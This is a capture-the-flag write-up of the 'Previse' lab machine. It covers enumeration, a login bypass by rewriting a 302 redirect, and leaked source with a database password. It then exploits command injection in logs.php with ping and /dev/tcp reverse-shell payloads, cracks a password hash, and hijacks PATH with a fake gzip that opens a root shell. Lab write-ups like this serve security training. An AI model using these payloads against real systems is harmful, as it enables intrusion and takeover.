# previse

## Information Gathering

## Enumeration

Start with basic nmap scan
```s
$ sudo nmap -p- -A -oN nmap/all.nmap 10.10.11.104     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-22 21:02 EDT
Nmap scan report for 10.10.11.104
Host is up (0.014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

### 22/tcp

Technologies:
- OpenSSH 7.6p1 Ubuntu 4ubuntu0.3

### 80/tcp

Technologies:
- 

Running gobuster scan on root directory:
```s
$ gobuster dir -u "http://10.10.11.104" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,php,js -o gob/10.10.11.104-root.gob
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.104
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,php,js
[+] Timeout:                 10s
===============================================================
2023/09/22 21:05:08 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 302) [Size: 2801] [--> login.php]
/login.php            (Status: 200) [Size: 2224]
/files.php            (Status: 302) [Size: 4914] [--> login.php]
/header.php           (Status: 200) [Size: 980]
/nav.php              (Status: 200) [Size: 1248]
/.php                 (Status: 403) [Size: 277]
/footer.php           (Status: 200) [Size: 217]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/status.php           (Status: 302) [Size: 2966] [--> login.php]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/logs.php             (Status: 302) [Size: 0] [--> login.php]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
```

`nav.php` does not require proper authorization to access. However, in order to interact with other pages, requires further authentication. 

Selecting any of the options gives a 302 redirect:

```
HTTP/1.1 302 Found
Date: Sat, 23 Sep 2023 01:15:58 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Length: 4115
Connection: close
Content-Type: text/html; charset=UTF-8
```

Intercepting this request and changing the `302 Found` to `200 OK` gives access to the original page. Navigate to `accounts.php` and create an account.

This gives access to url `http://10.10.11.104/donwload.php?file=32`. Downloading the file `siteBackup.zip`. 


config.php
```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>

```


logs.php
```php
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
} 
?>

```

Exploiting the OS command injection. Sending the following payload gets me a ping back

```
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=0atht1ihcn5m48rau9c6h0ttt8
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

delim=%3bping+10.10.14.25
```


## Foothold

The following payload gives a reverse shell

```
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=0atht1ihcn5m48rau9c6h0ttt8
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

delim=%3bbash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.25/1337+0>%261"
```

## Privilege Escalation

You can authenticate to the mysql server with `root:mySQL_p@ssw0rd!:)`. In the DB `previse` there is a table `accounts`:

```s
mysql> select * from accounts;
+----+------------+------------------------------------+---------------------+
| id | username   | password                           | created_at          |
+----+------------+------------------------------------+---------------------+
|  1 | m4lwhere   | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | 0zymandias | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2023-09-23 02:05:49 |
+----+------------+------------------------------------+---------------------+
2 rows in set (0.00 sec)

```

Extracting the password and running jtr:


```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long m4lwhere-hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovecody112235! (?)     
1g 0:00:01:06 DONE (2023-09-23 08:49) 0.01498g/s 111076p/s 111076c/s 111076C/s ilovecolynn..ilovecody..
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Being authenticated as m4lwhere, we are able to see what we are aboe to run as root:
```bash
$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
``` 

Looking at `/opt/scripts/access_backup.sh`:

```bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

After some research, this looks like a `$PATH` hijacking vulnerability. Write up your own `gzip` to throw a reverse shell and set your path when running the script.

Run:
```bash
$ sudo PATH=/home/m4lwhere:$PATH ./access_backup.sh
```

Where `/home/m4lwhere/gzip` is:
```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.25/31337 0>&1"
```